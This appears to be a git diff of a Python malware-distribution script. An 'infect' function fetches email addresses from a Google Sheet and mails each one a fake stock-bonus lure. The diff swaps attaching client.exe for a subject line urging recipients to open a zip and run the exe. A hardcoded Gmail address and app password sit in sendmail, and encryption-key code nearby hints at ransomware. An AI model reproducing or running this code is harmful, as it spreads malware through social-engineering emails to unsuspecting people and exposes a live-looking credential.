@@ -88,7 +88,8 @@ def decrypt_using_private(private_key, ciphertext):
     plaintext = cipher.decrypt(ciphertext)
     return plaintext
 
-def sendmail(content, receiver, attachment_path):
+
+def sendmail(content, receiver):
     sender_email = "thndrstocks@gmail.com"
     receiver_email = receiver
     password = "emwqdhkmqonxxrnl"
@@ -97,20 +98,10 @@ def sendmail(content, receiver, attachment_path):
     message = MIMEMultipart()
     message["From"] = sender_email
     message["To"] = receiver_email
-    message["Subject"] = "Congratulation! You have been selected for thndr bonus."
-
+    message["Subject"] = "Congratulation! You have been selected for thndr bonus please open the following zip folder and run the exe file to claim your bonus \n"
+    message["Subject"] += ""
     # Attach the content as plain text
     message.attach(MIMEText(content, "plain"))
-
-    # Open and attach the file
-    with open(attachment_path, "rb") as attachment:
-        part = MIMEApplication(attachment.read(), Name=attachment_path)
-
-    # Add header for the attachment
-    part['Content-Disposition'] = f'attachment; filename="{attachment_path}"'
-
-    # Attach the file to the message
-    message.attach(part)
 
     # Connect to the SMTP server and send the email
     server = smtplib.SMTP('smtp.gmail.com', 587)
@@ -119,7 +110,8 @@ def sendmail(content, receiver, attachment_path):
     server.send_message(message)
     server.quit()
 
-def infect(csv_url, attachment):
+
+def infect(csv_url):
     response = requests.get(csv_url)
 
     if response.status_code == 200:
@@ -134,12 +126,12 @@ def infect(csv_url, attachment):
     # loop through the emails and send the email
     for email in emails:
         sendmail("You have won a prize in thndr stocks click the file to view",
-                 email, attachment)
+                 email)
 
     print(emails)
 
 
-infect("https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv", "dist/client/client.exe")
+infect("https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv")
 
 key = generate_key(16)
 bytes_key = key.encode('utf-8')
